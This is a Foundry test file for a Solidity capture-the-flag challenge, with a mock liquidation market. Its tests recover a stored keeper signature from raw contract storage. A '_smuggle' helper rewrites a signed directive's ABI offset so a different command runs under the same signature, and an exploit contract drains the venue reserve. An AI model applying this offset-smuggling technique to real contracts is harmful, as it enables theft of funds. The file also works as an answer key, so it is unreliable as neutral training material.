// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

import "script/exploit/Exploit.sol";
import "src/BadDebtMarket.sol";
import "src/Challenge.sol";
import "src/DirectivePreviewLib.sol";
import "src/LiquidationEngine.sol";
import "src/LiquidationVenue.sol";
import "src/MockERC20.sol";

contract ChallengeTest is Test {
    address private constant BORROWER = address(0xB0B);
    bytes32 private constant DIRECTIVE_KEY_DOMAIN = keccak256("LIQUID_OMENS_DIRECTIVE_KEY_V1");
    bytes32 private constant DIRECTIVE_JOURNAL_DOMAIN = keccak256("LIQUID_OMENS_DIRECTIVE_JOURNAL_V1");

    uint256 private constant KEEPER_PRIVATE_KEY =
        0xA11CE0A11CE0A11CE0A11CE0A11CE0A11CE0A11CE0A11CE0A11CE0A11CE0A11;
    uint256 private constant POSITION_COLLATERAL = 160 ether;
    uint256 private constant POSITION_DEBT = 100 ether;
    uint256 private constant ENGINE_FLOAT = POSITION_DEBT;
    uint256 private constant VENUE_RESERVE = 1_000 ether;

    address internal player = makeAddr("player");
    address internal system = makeAddr("system");

    Challenge internal challenge;
    MockERC20 internal quoteToken;
    LiquidationEngine internal engine;
    bytes internal signature;
    uint256 internal directiveFilingBlock;

    function setUp() public {
        vm.startPrank(system);

        MockERC20 collateralToken = new MockERC20("Shadow Margin", "sMARGIN");
        quoteToken = new MockERC20("Omens Dollar", "oUSD");

        BadDebtMarket market = new BadDebtMarket(collateralToken, quoteToken);
        LiquidationVenue venue = new LiquidationVenue(collateralToken, quoteToken, VENUE_RESERVE);
        engine = new LiquidationEngine(market, venue, quoteToken, vm.addr(KEEPER_PRIVATE_KEY), player);

        market.setEngine(address(engine));
        venue.setEngine(address(engine));

        collateralToken.mint(address(market), POSITION_COLLATERAL);
        quoteToken.mint(address(engine), ENGINE_FLOAT);
        quoteToken.mint(address(venue), VENUE_RESERVE);
        market.seedPosition(BORROWER, POSITION_COLLATERAL, POSITION_DEBT);

        DirectivePreviewLib.DirectivePreview memory preview = DirectivePreviewLib.DirectivePreview({
            directiveKind: DirectivePreviewLib.liquidationDirectiveKind(),
            commandHash: keccak256(abi.encodeCall(LiquidationVenue.highlyProfitableTradingStrategy, ()))
        });

        bytes32 digest = DirectivePreviewLib.digest(preview, address(engine));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(KEEPER_PRIVATE_KEY, digest);
        signature = abi.encodePacked(r, s, v);

        challenge = new Challenge(player, collateralToken, quoteToken, market, venue, engine);
        directiveFilingBlock = block.number;
        engine.recordDirective(signature);

        vm.stopPrank();
    }

    function testCanonicalDirectivePaysTheQuotedBountyAndBricksInstance() external {
        bytes memory recoveredSignature = _loadDirective(address(engine), directiveFilingBlock);
        bytes memory directive = _buildCanonicalDirective();

        engine.liquidate(directive, recoveredSignature);

        assertEq(quoteToken.balanceOf(player), 60 ether);
        assertFalse(challenge.isSolved());

        bytes memory maliciousCommand = abi.encodeCall(LiquidationVenue.settleLot, ());
        bytes memory smuggledDirective = _smuggle(directive, maliciousCommand);

        vm.expectRevert(LiquidationEngine.BorrowerIsHealthy.selector);
        engine.liquidate(smuggledDirective, recoveredSignature);
    }

    function testSignatureIsRecoverableFromDirectiveJournal() external {
        bytes memory recoveredSignature = _loadDirective(address(engine), directiveFilingBlock);

        assertEq(keccak256(recoveredSignature), keccak256(signature));
    }

    function testWrongFilingBlockDoesNotRecoverSignature() external {
        bytes memory recoveredSignature = _loadDirective(address(engine), directiveFilingBlock + 1);

        assertFalse(keccak256(recoveredSignature) == keccak256(signature));
    }

    function testSignatureMatchesCanonicalDirectiveButNotNetInventoryDirective() external {
        bytes memory recoveredSignature = _loadDirective(address(engine), directiveFilingBlock);
        bytes memory canonicalDirective = _buildCanonicalDirective();
        bytes memory decoyDirective = _buildNetInventoryDirective();

        assertEq(_recoverSigner(this.previewDigest(canonicalDirective), recoveredSignature), engine.keeperSigner());
        assertTrue(_recoverSigner(this.previewDigest(decoyDirective), recoveredSignature) != engine.keeperSigner());
    }

    function testPreviewIgnoresTheRewrittenCommandOffset() external {
        bytes memory directive = _buildCanonicalDirective();

        bytes32 canonicalHash = this.previewCommandHash(directive);
        bytes memory maliciousCommand = abi.encodeCall(LiquidationVenue.settleLot, ());
        bytes memory smuggledDirective = _smuggle(directive, maliciousCommand);
        bytes32 smuggledHash = this.previewCommandHash(smuggledDirective);

        assertEq(smuggledHash, canonicalHash);
    }

    function testNetInventoryLooksPlausibleButDoesNotSolve() external {
        bytes memory recoveredSignature = _loadDirective(address(engine), directiveFilingBlock);
        bytes memory directive = _buildCanonicalDirective();
        bytes memory decoyCommand = abi.encodeCall(LiquidationVenue.netInventory, ());
        bytes memory smuggledDirective = _smuggle(directive, decoyCommand);

        engine.liquidate(smuggledDirective, recoveredSignature);

        assertEq(quoteToken.balanceOf(player), 80 ether);
        assertFalse(challenge.isSolved());
    }

    function testExploitSolvesTheChallenge() external {
        bytes memory recoveredSignature = _loadDirective(address(engine), _findDirectiveBlock(address(engine)));
        Exploit exploit = new Exploit(challenge, recoveredSignature);
        exploit.exploit();

        assertEq(quoteToken.balanceOf(player), VENUE_RESERVE);
        assertTrue(challenge.isSolved());
    }

    function previewCommandHash(bytes calldata directive) external pure returns (bytes32) {
        return DirectivePreviewLib.load(directive).commandHash;
    }

    function previewDigest(bytes calldata directive) external view returns (bytes32) {
        return DirectivePreviewLib.digest(directive, address(engine));
    }

    function _buildCanonicalDirective() private pure returns (bytes memory) {
        return abi.encode(
            DirectivePreviewLib.liquidationDirectiveKind(), abi.encodeCall(LiquidationVenue.highlyProfitableTradingStrategy, ())
        );
    }

    function _buildNetInventoryDirective() private pure returns (bytes memory) {
        return abi.encode(DirectivePreviewLib.liquidationDirectiveKind(), abi.encodeCall(LiquidationVenue.netInventory, ()));
    }

    function _loadDirective(address target, uint256 filingBlock) private view returns (bytes memory data) {
        uint256 filingKey = _directiveFilingKey(filingBlock);
        uint256 base = uint256(keccak256(abi.encode(DIRECTIVE_JOURNAL_DOMAIN, filingKey)));
        uint256 directiveLength = uint256(vm.load(target, bytes32(base)));
        data = new bytes(directiveLength);
        uint256 words = (directiveLength + 31) / 32;

        for (uint256 i = 0; i < words; ++i) {
            bytes32 word = vm.load(target, bytes32(base + i + 1));
            assembly {
                mstore(add(add(data, 0x20), mul(i, 0x20)), word)
            }
        }
    }

    function _directiveFilingKey(uint256 filingBlock) private view returns (uint256) {
        return uint256(keccak256(abi.encode(DIRECTIVE_KEY_DOMAIN, player, filingBlock)));
    }

    function _findDirectiveBlock(address target) private view returns (uint256 filingBlock) {
        for (uint256 candidate = block.number + 1; candidate > 0; --candidate) {
            uint256 blockNumber = candidate - 1;
            uint256 filingKey = _directiveFilingKey(blockNumber);
            uint256 base = uint256(keccak256(abi.encode(DIRECTIVE_JOURNAL_DOMAIN, filingKey)));

            if (uint256(vm.load(target, bytes32(base))) == 65) {
                return blockNumber;
            }
        }

        revert("Directive not found");
    }

    function _recoverSigner(bytes32 digest, bytes memory sig) private pure returns (address signer) {
        if (sig.length != 65) {
            return address(0);
        }

        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            r := mload(add(sig, 0x20))
            s := mload(add(sig, 0x40))
            v := byte(0, mload(add(sig, 0x60)))
        }

        if (v < 27) {
            v += 27;
        }

        signer = ecrecover(digest, v, r, s);
    }

    function _smuggle(bytes memory directive, bytes memory maliciousCommand) private pure returns (bytes memory smuggled) {
        uint256 paddedCommandLength = _roundUp32(maliciousCommand.length);
        uint256 smuggledCommandOffset = directive.length;

        smuggled = new bytes(directive.length + 0x20 + paddedCommandLength);

        _copy(smuggled, 0, directive, 0, directive.length);
        _storeWord(smuggled, 0x20, smuggledCommandOffset);
        _storeWord(smuggled, smuggledCommandOffset, maliciousCommand.length);
        _copy(smuggled, smuggledCommandOffset + 0x20, maliciousCommand, 0, maliciousCommand.length);
    }

    function _copy(bytes memory dst, uint256 dstOffset, bytes memory src, uint256 srcOffset, uint256 len) private pure {
        for (uint256 i = 0; i < len; ++i) {
            dst[dstOffset + i] = src[srcOffset + i];
        }
    }

    function _storeWord(bytes memory data, uint256 offset, uint256 value) private pure {
        assembly {
            mstore(add(add(data, 0x20), offset), value)
        }
    }

    function _roundUp32(uint256 n) private pure returns (uint256) {
        return (n + 31) & ~uint256(31);
    }
}
